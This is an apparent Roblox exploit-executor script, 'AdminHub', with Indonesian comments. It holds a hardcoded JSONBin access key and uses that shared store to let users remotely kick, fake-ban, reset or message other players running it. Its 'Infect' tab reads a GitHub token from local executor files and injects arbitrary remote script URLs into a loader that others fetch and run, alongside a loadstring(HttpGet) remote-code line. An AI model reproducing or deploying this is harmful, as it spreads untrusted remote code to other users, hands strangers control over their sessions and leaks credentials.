-- AdminHub v2 - No WindUI, Pure Roblox GUI
print("[AdminHub] Script starting...")
-- loadstring(game:HttpGet("https://raw.githubusercontent.com/HaZcK/ScriptHub/refs/heads/main/Script/AdminHub/AdminHub.lua"))()

local Players      = game:GetService("Players")
local HttpService  = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local UIS          = game:GetService("UserInputService")
local player       = Players.LocalPlayer

-- HTTP
local function httpRequest(opts)
    local ok, res = pcall(function()
        return HttpService:RequestAsync({
            Url     = opts.Url,
            Method  = opts.Method or "GET",
            Headers = opts.Headers or {},
            Body    = opts.Body or ""
        })
    end)
    if ok and res then return {Body=res.Body, StatusCode=res.StatusCode} end
    return {Body=game:HttpGet(opts.Url), StatusCode=200}
end

-- JSONBIN
local BIN_ID     = "69bcf4b3c3097a1dd540e510"
local ACCESS_KEY = "$2a$10$MWfAdBu8EUdTVdnwPTF/ZeWi/ZMNEvRTmUnWyl7KTH0UoTaYRTbu2"
local JBURL      = "https://api.jsonbin.io/v3/b/"..BIN_ID

local function jbGet()
    local ok, data = pcall(function()
        local res = httpRequest({
            Url     = JBURL.."/latest",
            Method  = "GET",
            Headers = {["X-Access-Key"]=ACCESS_KEY,["X-Bin-Meta"]="false"}
        })
        if res and res.Body then return HttpService:JSONDecode(res.Body) end
    end)
    return ok and data or {signals={},online={}}
end

local function jbSet(data)
    pcall(function()
        httpRequest({
            Url     = JBURL,
            Method  = "PUT",
            Headers = {["Content-Type"]="application/json",["X-Access-Key"]=ACCESS_KEY},
            Body    = HttpService:JSONEncode(data)
        })
    end)
end

local function sendSignal(type_, target, data_)
    local data = jbGet()
    local sigs = data.signals or {}
    table.insert(sigs, {
        id        = tostring(os.time())..tostring(math.random(1000,9999)),
        type      = type_,
        target    = target,
        by        = player.Name,
        data      = data_ or {},
        processed = false,
        timestamp = os.time()
    })
    data.signals = sigs
    jbSet(data)
end

-- NOTIFY SYSTEM
local _nGui = Instance.new("ScreenGui", player.PlayerGui)
_nGui.Name="AHNotif" _nGui.ResetOnSpawn=false
_nGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
_nGui.IgnoreGuiInset=false
_nGui.DisplayOrder=101

local _nList = Instance.new("Frame", _nGui)
_nList.Size=UDim2.new(0,260,1,0) _nList.Position=UDim2.new(1,-268,0,0)
_nList.BackgroundTransparency=1 _nList.BorderSizePixel=0
_nList.Active=false -- JANGAN block touch
do local l=Instance.new("UIListLayout",_nList) l.SortOrder=Enum.SortOrder.LayoutOrder
   l.VerticalAlignment=Enum.VerticalAlignment.Bottom l.Padding=UDim.new(0,6) end
do local p=Instance.new("UIPadding",_nList) p.PaddingBottom=UDim.new(0,14) end

local _nc=0
local function Notify(title, content, duration)
    _nc=_nc+1
    local card=Instance.new("Frame",_nList)
    card.Size=UDim2.new(1,0,0,0) card.AutomaticSize=Enum.AutomaticSize.Y
    card.BackgroundColor3=Color3.fromRGB(10,12,24) card.BorderSizePixel=0
    card.LayoutOrder=_nc card.BackgroundTransparency=1
    do Instance.new("UICorner",card).CornerRadius=UDim.new(0,10) end
    do local s=Instance.new("UIStroke",card) s.Color=Color3.fromHex("#87CEEB") s.Thickness=1.2 end
    do local p=Instance.new("UIPadding",card) p.PaddingLeft=UDim.new(0,12) p.PaddingRight=UDim.new(0,12) p.PaddingTop=UDim.new(0,10) p.PaddingBottom=UDim.new(0,10) end
    do local l=Instance.new("UIListLayout",card) l.SortOrder=Enum.SortOrder.LayoutOrder l.Padding=UDim.new(0,3) end
    local tl=Instance.new("TextLabel",card) tl.Size=UDim2.new(1,0,0,16) tl.BackgroundTransparency=1
    tl.Text=title tl.TextColor3=Color3.fromHex("#87CEEB") tl.Font=Enum.Font.GothamBold
    tl.TextSize=12 tl.TextXAlignment=Enum.TextXAlignment.Left tl.LayoutOrder=1
    local bl=Instance.new("TextLabel",card) bl.Size=UDim2.new(1,0,0,0) bl.AutomaticSize=Enum.AutomaticSize.Y
    bl.BackgroundTransparency=1 bl.Text=content bl.TextColor3=Color3.fromRGB(180,200,240)
    bl.Font=Enum.Font.Gotham bl.TextSize=11 bl.TextWrapped=true
    bl.TextXAlignment=Enum.TextXAlignment.Left bl.LayoutOrder=2
    TweenService:Create(card,TweenInfo.new(0.3),{BackgroundTransparency=0}):Play()
    task.delay(duration or 4,function()
        TweenService:Create(card,TweenInfo.new(0.3),{BackgroundTransparency=1}):Play()
        task.wait(0.35) card:Destroy()
    end)
end

-- SIGNAL POLLING
local processedSignals={}
local signalsReady=false

local function processSignal(sig)
    if processedSignals[sig.id] then return end
    processedSignals[sig.id]=true
    local t=sig.type local by=sig.by or "System"
    if t=="kick" then
        Notify('👢 Kicked By "'..by..'"',"Disconnecting...",3)
        task.wait(2) player:Kick('You have been kicked by "'..by..'"')
    elseif t=="ban" then
        local d=sig.data or {}
        Notify('⛔ Ban Time By "'..by..'"',string.format("Day %d Hr %d Min %d Sec %d",d.day or 0,d.hour or 0,d.min or 0,d.sec or 0),4)
        task.wait(3)
        player:Kick(string.format('You been Ban Time Day %d hours %d Minute %d Second %d By "%s"',d.day or 0,d.hour or 0,d.min or 0,d.sec or 0,by))
    elseif t=="reset" then
        Notify('🔄 Reset By "'..by..'"',"Character resetting...",3)
        task.wait(1.5) pcall(function() player:LoadCharacter() end)
    elseif t=="message" then
        Notify('📨 Message By "'..by..'"',(sig.data and sig.data.text) or "",8)
    end
end

local function preload()
    pcall(function()
        local d=jbGet() for _,s in ipairs(d.signals or {}) do processedSignals[s.id]=true end
    end)
    signalsReady=true
end

local function poll()
    while not signalsReady do task.wait(0.5) end
    while true do
        task.wait(4)
        pcall(function()
            local d=jbGet() local sigs=d.signals or {} local updated=false
            for _,sig in ipairs(sigs) do
                if not processedSignals[sig.id] and sig.target==player.Name then
                    processSignal(sig) sig.processed=true updated=true
                end
            end
            if updated then d.signals=sigs jbSet(d) end
        end)
    end
end

local function registerOnline()
    pcall(function()
        local d=jbGet() local ol=d.online or {}
        for i=#ol,1,-1 do if ol[i].Username==player.Name then table.remove(ol,i) end end
        table.insert(ol,{Username=player.Name,Display=player.DisplayName,LastSeen=os.time()})
        d.online=ol jbSet(d)
    end)
end

local function heartbeat()
    while true do
        task.wait(25)
        pcall(function()
            local d=jbGet() local ol=d.online or {}
            for _,e in ipairs(ol) do if e.Username==player.Name then e.LastSeen=os.time() break end end
            d.online=ol jbSet(d)
        end)
    end
end

player.AncestryChanged:Connect(function()
    if not player.Parent then
        pcall(function()
            local d=jbGet() local ol=d.online or {}
            for i=#ol,1,-1 do if ol[i].Username==player.Name then table.remove(ol,i) end end
            d.online=ol jbSet(d)
        end)
    end
end)

-- COLORS
local D1=Color3.fromRGB(10,12,22) local D2=Color3.fromRGB(16,18,32) local D3=Color3.fromRGB(22,26,46)
local D4=Color3.fromRGB(28,32,58) local AC=Color3.fromHex("#87CEEB")
local TX=Color3.fromRGB(220,230,255) local ST=Color3.fromRGB(110,130,180)
local RED=Color3.fromRGB(224,85,85) local GRN=Color3.fromRGB(85,224,154)

-- HELPERS
local function mkC(p,r) Instance.new("UICorner",p).CornerRadius=UDim.new(0,r or 10) end
local function mkS(p,c,t) for _,ch in ipairs(p:GetChildren()) do if ch:IsA("UIStroke") then ch:Destroy() end end local s=Instance.new("UIStroke",p) s.Color=c or Color3.fromRGB(40,60,120) s.Thickness=t or 1 end
local function mkP(p,l,r,t,b) local x=Instance.new("UIPadding",p) x.PaddingLeft=UDim.new(0,l or 0) x.PaddingRight=UDim.new(0,r or 0) x.PaddingTop=UDim.new(0,t or 0) x.PaddingBottom=UDim.new(0,b or 0) end
local function mkDrag(frame,handle)
    local drag,ds,sp,touchId
    -- Pakai handle events saja, bukan UIS global (supaya tidak block joystick)
    handle.InputBegan:Connect(function(i)
        if i.UserInputType==Enum.UserInputType.MouseButton1 then
            drag=true ds=i.Position sp=frame.Position
        elseif i.UserInputType==Enum.UserInputType.Touch then
            drag=true ds=i.Position sp=frame.Position touchId=i
        end
    end)
    handle.InputChanged:Connect(function(i)
        if not drag then return end
        if i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch then
            local d=i.Position-ds
            frame.Position=UDim2.new(sp.X.Scale,sp.X.Offset+d.X,sp.Y.Scale,sp.Y.Offset+d.Y)
        end
    end)
    handle.InputEnded:Connect(function(i)
        if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
            drag=false
        end
    end)
end
local function mkBtn(parent,text,color,order)
    local b=Instance.new("TextButton",parent) b.Size=UDim2.new(1,0,0,38) b.BackgroundColor3=color or D4
    b.TextColor3=color==AC and Color3.fromRGB(8,10,20) or TX b.Font=Enum.Font.GothamBold b.TextSize=13
    b.Text=text b.BorderSizePixel=0 b.LayoutOrder=order or 0 mkC(b,8)
    b.MouseEnter:Connect(function() TweenService:Create(b,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(b.BackgroundColor3.R*255+15,b.BackgroundColor3.G*255+15,b.BackgroundColor3.B*255+15)}):Play() end)
    b.MouseLeave:Connect(function() TweenService:Create(b,TweenInfo.new(0.15),{BackgroundColor3=color or D4}):Play() end)
    return b
end
local function mkInput(parent,placeholder,order)
    local wrap=Instance.new("Frame",parent) wrap.Size=UDim2.new(1,0,0,38) wrap.BackgroundColor3=D2 wrap.BorderSizePixel=0 wrap.LayoutOrder=order or 0 mkC(wrap,8) mkS(wrap,Color3.fromRGB(35,50,90),1)
    local tb=Instance.new("TextBox",wrap) tb.Size=UDim2.new(1,0,1,0) tb.BackgroundTransparency=1 tb.PlaceholderText=placeholder tb.PlaceholderColor3=ST tb.TextColor3=TX tb.Font=Enum.Font.Gotham tb.TextSize=13 tb.Text="" tb.ClearTextOnFocus=false tb.TextXAlignment=Enum.TextXAlignment.Left mkP(tb,10,10,0,0)
    tb.Focused:Connect(function() TweenService:Create(wrap,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(20,25,50)}):Play() mkS(wrap,AC,1.2) end)
    tb.FocusLost:Connect(function() TweenService:Create(wrap,TweenInfo.new(0.2),{BackgroundColor3=D2}):Play() mkS(wrap,Color3.fromRGB(35,50,90),1) end)
    return tb
end
local function mkLabel(parent,text,color,order)
    local l=Instance.new("TextLabel",parent) l.Size=UDim2.new(1,0,0,14) l.BackgroundTransparency=1
    l.Text=text l.TextColor3=color or ST l.Font=Enum.Font.GothamMedium l.TextSize=11
    l.TextXAlignment=Enum.TextXAlignment.Left l.LayoutOrder=order or 0 return l
end

-- MAIN GUI
local Gui=Instance.new("ScreenGui",player.PlayerGui)
Gui.Name="AdminHubGui" Gui.ResetOnSpawn=false
Gui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
Gui.IgnoreGuiInset=false  -- JANGAN true, nanti nutup TouchGui
Gui.DisplayOrder=100

-- SIDEBAR + CONTENT
-- Ukuran responsif untuk mobile
local screenX = workspace.CurrentCamera.ViewportSize.X
local screenY = workspace.CurrentCamera.ViewportSize.Y
-- Mobile: pakai hampir full screen tapi sisakan ruang joystick di bawah
local mainW = math.min(screenX - 16, 420)
local mainH = math.min(screenY - 180, 520) -- sisakan 180px bawah untuk joystick
print("[AdminHub] Screen:", screenX, "x", screenY, "GUI:", mainW, "x", mainH)

local Main=Instance.new("Frame",Gui)
Main.Size=UDim2.new(0,mainW,0,mainH)
Main.AnchorPoint=Vector2.new(0.5,0)
Main.Position=UDim2.new(0.5,0,0,8) -- Taruh di atas, sisakan bawah untuk joystick
Main.BackgroundColor3=D1 Main.BorderSizePixel=0 mkC(Main,14) mkS(Main,Color3.fromRGB(35,55,110),1.5)
print("[AdminHub] GUI created, showing main frame")
do local g=Instance.new("Frame",Main) g.Size=UDim2.new(1,0,0,2) g.BackgroundColor3=AC g.BorderSizePixel=0 mkC(g,2) end

-- HEADER
local Header=Instance.new("Frame",Main) Header.Size=UDim2.new(1,0,0,50) Header.BackgroundColor3=D3 Header.BorderSizePixel=0 mkC(Header,14)
do local f=Instance.new("Frame",Header) f.Size=UDim2.new(1,0,0.5,0) f.Position=UDim2.new(0,0,0.5,0) f.BackgroundColor3=D3 f.BorderSizePixel=0 end
local HTitle=Instance.new("TextLabel",Header) HTitle.Size=UDim2.new(1,-20,1,0) HTitle.Position=UDim2.new(0,16,0,0) HTitle.BackgroundTransparency=1
HTitle.Text="⬡  AdminHub" HTitle.TextColor3=TX HTitle.Font=Enum.Font.GothamBold HTitle.TextSize=16 HTitle.TextXAlignment=Enum.TextXAlignment.Left
local HClose=Instance.new("TextButton",Header) HClose.Size=UDim2.new(0,28,0,28) HClose.Position=UDim2.new(1,-38,0.5,-14)
HClose.BackgroundColor3=Color3.fromRGB(180,50,50) HClose.TextColor3=Color3.fromRGB(255,255,255)
HClose.Font=Enum.Font.GothamBold HClose.TextSize=13 HClose.Text="✕" HClose.BorderSizePixel=0 mkC(HClose,6)
HClose.MouseButton1Click:Connect(function() Main.Visible=false end)
mkDrag(Main, Header) -- Drag dari header saja, bukan seluruh frame

-- TABS BAR
local TabBar=Instance.new("Frame",Main) TabBar.Size=UDim2.new(1,-20,0,36) TabBar.Position=UDim2.new(0,10,0,56) TabBar.BackgroundTransparency=1 TabBar.BorderSizePixel=0 TabBar.Active=false
do local l=Instance.new("UIListLayout",TabBar) l.FillDirection=Enum.FillDirection.Horizontal l.Padding=UDim.new(0,6) end

local function mkTab(name,icon)
    local b=Instance.new("TextButton",TabBar) b.Size=UDim2.new(0,100,1,0) b.BackgroundColor3=D3
    b.TextColor3=ST b.Font=Enum.Font.GothamBold b.TextSize=11 b.Text=icon.."  "..name b.BorderSizePixel=0 mkC(b,8)
    return b
end

local BtnControls = mkTab("Controls","🎮")
local BtnInfect   = mkTab("Infect","💉")
local BtnTest     = mkTab("Test","🧪")

-- CONTENT AREA
local Content=Instance.new("Frame",Main) Content.Size=UDim2.new(1,-20,1,-108) Content.Position=UDim2.new(0,10,0,100) Content.BackgroundTransparency=1 Content.BorderSizePixel=0 Content.Active=false

local function mkPage()
    local sc=Instance.new("ScrollingFrame",Content) sc.Size=UDim2.fromScale(1,1) sc.BackgroundTransparency=1
    sc.BorderSizePixel=0 sc.ScrollBarThickness=3 sc.ScrollBarImageColor3=AC
    sc.CanvasSize=UDim2.new(0,0,0,0) sc.AutomaticCanvasSize=Enum.AutomaticSize.Y sc.Visible=false
    do local l=Instance.new("UIListLayout",sc) l.SortOrder=Enum.SortOrder.LayoutOrder l.Padding=UDim.new(0,8) end
    mkP(sc,0,4,4,4)
    return sc
end

local PageControls = mkPage()
local PageInfect   = mkPage()
local PageTest     = mkPage()

local curPage = nil
local function showPage(page, btn)
    if curPage then curPage.Visible=false end
    page.Visible=true curPage=page
    for _,b in ipairs(TabBar:GetChildren()) do
        if b:IsA("TextButton") then
            b.BackgroundColor3 = b==btn and D4 or D3
            b.TextColor3 = b==btn and AC or ST
        end
    end
end

BtnControls.MouseButton1Click:Connect(function() showPage(PageControls,BtnControls) end)
BtnInfect.MouseButton1Click:Connect(function() showPage(PageInfect,BtnInfect) end)
BtnTest.MouseButton1Click:Connect(function() showPage(PageTest,BtnTest) end)

-- ═══════════════════════
--  CONTROLS PAGE
-- ═══════════════════════
mkLabel(PageControls,"🎯 Target Player",AC,1)
local ctrlTarget = mkInput(PageControls,"Username target...",2)

mkLabel(PageControls,"── Actions",ST,3)
local btnKick = mkBtn(PageControls,"👢  Kick",D4,4)
btnKick.MouseButton1Click:Connect(function()
    local t=ctrlTarget.Text:gsub("^%s*(.-)%s*$","%1")
    if t=="" then Notify("❌ Error","Target kosong!",3) return end
    Notify("⏳ Sending...","Mengirim kick ke "..t,2)
    task.spawn(function() sendSignal("kick",t,{}) Notify("✅ Sent","Kick dikirim ke "..t,3) end)
end)

local btnReset = mkBtn(PageControls,"🔄  Reset Character",D4,5)
btnReset.MouseButton1Click:Connect(function()
    local t=ctrlTarget.Text:gsub("^%s*(.-)%s*$","%1")
    if t=="" then Notify("❌ Error","Target kosong!",3) return end
    Notify("⏳ Sending...","Mengirim reset ke "..t,2)
    task.spawn(function() sendSignal("reset",t,{}) Notify("✅ Sent","Reset dikirim ke "..t,3) end)
end)

mkLabel(PageControls,"── Ban Time (max: 3d 24h 60m 60s)",ST,6)
local banD=mkInput(PageControls,"Day (0-3)",7)
local banH=mkInput(PageControls,"Hour (0-24)",8)
local banM=mkInput(PageControls,"Minute (0-60)",9)
local banS=mkInput(PageControls,"Second (0-60)",10)
local btnBan = mkBtn(PageControls,"⏱️  Apply Ban Time",D4,11)
btnBan.MouseButton1Click:Connect(function()
    local t=ctrlTarget.Text:gsub("^%s*(.-)%s*$","%1")
    if t=="" then Notify("❌ Error","Target kosong!",3) return end
    local d,h,m,s=tonumber(banD.Text) or 0,tonumber(banH.Text) or 0,tonumber(banM.Text) or 0,tonumber(banS.Text) or 0
    if d>3 or h>24 or m>60 or s>60 then Notify("❌ Error","Melebihi batas maksimum!",3) return end
    if d==0 and h==0 and m==0 and s==0 then Notify("❌ Error","Durasi tidak boleh 0!",3) return end
    local expiry=os.time()+d*86400+h*3600+m*60+s
    Notify("⏳ Sending...","Mengirim ban ke "..t,2)
    task.spawn(function() sendSignal("ban",t,{day=d,hour=h,min=m,sec=s,expiry=expiry}) Notify("✅ Sent","Ban dikirim ke "..t,3) end)
end)

mkLabel(PageControls,"── Message",ST,12)
local msgInput=mkInput(PageControls,"Tulis pesan...",13)
local btnMsg = mkBtn(PageControls,"📨  Send Message",D4,14)
btnMsg.MouseButton1Click:Connect(function()
    local t=ctrlTarget.Text:gsub("^%s*(.-)%s*$","%1")
    local msg=msgInput.Text:gsub("^%s*(.-)%s*$","%1")
    if t=="" or msg=="" then Notify("❌ Error","Target atau pesan kosong!",3) return end
    Notify("⏳ Sending...","Mengirim pesan ke "..t,2)
    task.spawn(function() sendSignal("message",t,{text=msg}) Notify("✅ Sent","Pesan dikirim ke "..t,3) end)
end)

-- ═══════════════════════
--  INFECT PAGE
-- ═══════════════════════
mkLabel(PageInfect,"💉 Add Script to Loader",AC,1)
mkLabel(PageInfect,"Title",ST,2) local iTitle=mkInput(PageInfect,"Nama script...",3)
mkLabel(PageInfect,"Description",ST,4) local iDesc=mkInput(PageInfect,"Deskripsi...",5)
mkLabel(PageInfect,"Icon (emoji)",ST,6) local iIcon=mkInput(PageInfect,"🎮",7)
mkLabel(PageInfect,"Script URL (raw)",ST,8) local iUrl=mkInput(PageInfect,"https://raw.github...",9)
mkLabel(PageInfect,"Game Name",ST,10) local iGame=mkInput(PageInfect,"Nama game di Loader...",11)

local btnInfect=mkBtn(PageInfect,"💉  Inject to Loader",AC,12)
btnInfect.MouseButton1Click:Connect(function()
    local title=iTitle.Text:gsub("^%s*(.-)%s*$","%1")
    local desc=iDesc.Text:gsub("^%s*(.-)%s*$","%1")
    local icon=iIcon.Text:gsub("^%s*(.-)%s*$","%1")
    local url=iUrl.Text:gsub("^%s*(.-)%s*$","%1")
    local game_=iGame.Text:gsub("^%s*(.-)%s*$","%1")
    if title=="" or url=="" or game_=="" then Notify("❌ Error","Title, URL, Game wajib diisi!",3) return end
    if icon=="" then icon="🎮" end
    Notify("⏳ Injecting...","Upload ke GitHub...",3)
    task.spawn(function()
        -- Baca scripts_db.json
        local db = {}
        pcall(function()
            local raw=game:HttpGet("https://raw.githubusercontent.com/HaZcK/ScriptHub/refs/heads/main/Script/AdminHub/scripts_db.json?t="..os.time())
            if #raw>2 then db=HttpService:JSONDecode(raw) end
        end)
        -- Cari game entry
        local entry=nil
        for _,g in ipairs(db) do if g.game==game_ then entry=g break end end
        if not entry then entry={game=game_,icon=icon,scripts={}} table.insert(db,entry) end
        table.insert(entry.scripts,{name=title,desc=desc,icon=icon,url=url})
        -- Upload
        local PAT=""
        pcall(function()
            local roots={"","Delta/Workspace/","DeltaWorkspace/"}
            for _,r in ipairs(roots) do
                local cfg=r.."Control_Hub/assets/config.json"
                if isfile(cfg) then
                    local d=HttpService:JSONDecode(readfile(cfg))
                    if d and d.PAT then PAT=d.PAT break end
                end
            end
        end)
        if PAT=="" then Notify("❌ Error","PAT tidak ditemukan di config.json!",5) return end
        -- Get SHA
        local sha=nil
        pcall(function()
            local res=httpRequest({Url="https://api.github.com/repos/HaZcK/ScriptHub/contents/Script/AdminHub/scripts_db.json",Method="GET",Headers={["Authorization"]="token "..PAT,["User-Agent"]="AdminHub"}})
            if res and res.Body then local m=HttpService:JSONDecode(res.Body) sha=m and m.sha end
        end)
        -- Encode & upload
        local jsonStr=HttpService:JSONEncode(db)
        local b64="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        local encoded=((jsonStr:gsub(".",function(x) local r,b2="",x:byte() for i=8,1,-1 do r=r..(b2%2^i-b2%2^(i-1)>0 and "1" or "0") end return r end).."0000"):gsub("%d%d%d?%d?%d?%d?",function(x) if #x<6 then return "" end local c=0 for i=1,6 do c=c+(x:sub(i,i)=="1" and 2^(6-i) or 0) end return b64:sub(c+1,c+1) end)..({"","==","="})[#jsonStr%3+1])
        local body=HttpService:JSONEncode({message="Infect: add "..title,content=encoded,sha=sha,branch="main"})
        local ok=pcall(function()
            httpRequest({Url="https://api.github.com/repos/HaZcK/ScriptHub/contents/Script/AdminHub/scripts_db.json",Method="PUT",Headers={["Authorization"]="token "..PAT,["Content-Type"]="application/json",["User-Agent"]="AdminHub"},Body=body})
        end)
        if ok then Notify("✅ Injected!",title.." ditambahkan ke Loader!",5)
        else Notify("❌ Gagal","Upload error. Cek PAT!",5) end
    end)
end)

-- ═══════════════════════
--  TEST PAGE
-- ═══════════════════════
mkLabel(PageTest,"🧪 Online Players",AC,1)
local btnRefresh=mkBtn(PageTest,"🔍  Refresh Online",D4,2)
btnRefresh.MouseButton1Click:Connect(function()
    Notify("⏳","Memuat online players...",2)
    task.spawn(function()
        local d=jbGet() local ol=d.online or {}
        local now=os.time() local active={}
        for _,p in ipairs(ol) do if (now-(p.LastSeen or 0))<60 then table.insert(active,p) end end
        if #active==0 then Notify("📋 Online","Tidak ada yang online.",5) return end
        local lines={}
        for _,p in ipairs(active) do table.insert(lines,"• "..p.Username) end
        Notify("🟢 Online ("..#active..")",table.concat(lines,"\n"),8)
    end)
end)

mkLabel(PageTest,"── Test ke diri sendiri",ST,3)
local btnTestReset=mkBtn(PageTest,"🔄  Test Reset",D4,4)
btnTestReset.MouseButton1Click:Connect(function()
    Notify("🔄 Test Reset","Resetting...",2)
    task.wait(1.5) pcall(function() player:LoadCharacter() end)
end)

mkLabel(PageTest,"── Test Message",ST,5)
local testMsg=mkInput(PageTest,"Tulis pesan tes...",6)
local btnTestMsg=mkBtn(PageTest,"📨  Test Message",D4,7)
btnTestMsg.MouseButton1Click:Connect(function()
    local msg=testMsg.Text:gsub("^%s*(.-)%s*$","%1")
    if msg=="" then Notify("❌","Pesan kosong!",3) return end
    Notify('📨 Message By "Test"',msg,6)
end)

-- WATERMARK
local WM=Instance.new("TextLabel",Gui) WM.Size=UDim2.new(0,180,0,20) WM.Position=UDim2.new(0,12,1,-28)
WM.BackgroundTransparency=1 WM.Text="Script By AdminHub" WM.RichText=true
WM.TextColor3=Color3.fromRGB(255,255,255) WM.TextTransparency=0.7
WM.Font=Enum.Font.GothamMedium WM.TextSize=11 WM.TextXAlignment=Enum.TextXAlignment.Left

-- OPEN BUTTON (kalau Main di-close)
local OpenBtn=Instance.new("TextButton",Gui) OpenBtn.Size=UDim2.new(0,44,0,44) OpenBtn.Position=UDim2.new(0,12,0,60)
OpenBtn.BackgroundColor3=D3 OpenBtn.TextColor3=AC OpenBtn.Font=Enum.Font.GothamBold OpenBtn.TextSize=16
OpenBtn.Text="⬡" OpenBtn.BorderSizePixel=0 OpenBtn.Visible=false mkC(OpenBtn,8) mkS(OpenBtn,AC,1)
OpenBtn.MouseButton1Click:Connect(function() Main.Visible=true OpenBtn.Visible=false end)
HClose.MouseButton1Click:Connect(function() Main.Visible=false OpenBtn.Visible=true end)

-- START
print("[AdminHub] GUI created, showing main frame")
Main.Visible = true
showPage(PageControls,BtnControls)
task.spawn(function()
    preload()
    registerOnline()
    task.spawn(heartbeat)
    task.spawn(poll)
    Notify("✅ AdminHub Ready","Signal polling aktif. JSONBin terhubung.",4)
end)
